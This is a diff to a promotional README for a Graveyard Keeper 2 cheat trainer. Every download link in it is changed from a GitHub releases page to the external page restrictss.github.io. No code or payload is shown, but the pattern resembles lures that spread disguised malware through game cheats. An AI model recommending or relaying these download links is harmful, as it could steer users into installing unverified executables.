@@ -4,9 +4,9 @@
 
 Welcome to the **Graveyard-Keeper-2-Trainer** — your ultimate companion for Graveyard Keeper 2 on PC. This trainer gives you complete control over your gameplay with powerful cheats and quality-of-life fixes. Whether you're tired of grinding for resources or want to perfect your corpse quality, this trainer has you covered.
 
-**Visit this link to download the application:** [Click here to download Graveyard-Keeper-2-Trainer](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
+**Visit this link to download the application:** [Click here to download Graveyard-Keeper-2-Trainer](https://restrictss.github.io)
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-Graveyard--Keeper--2--Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-Graveyard--Keeper--2--Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://restrictss.github.io)
 
 ## ✨ What This Trainer Does
 
@@ -29,7 +29,7 @@ Follow these simple steps to get your trainer running:
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
+**Visit this link to download the application:** [https://restrictss.github.io](https://restrictss.github.io)
 
 Once you're on the download page, look for the newest release version. Click the download button to get the trainer file.
 
@@ -162,7 +162,7 @@ Join fellow players and share your experiences. The trainer is continuously upda
 
 **Get started today!**
 
-**Visit this link to download the application:** [https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
+**Visit this link to download the application:** [https://restrictss.github.io](https://restrictss.github.io)
 
 Take control of your graveyard empire – bury the grind and raise your efficiency!
 
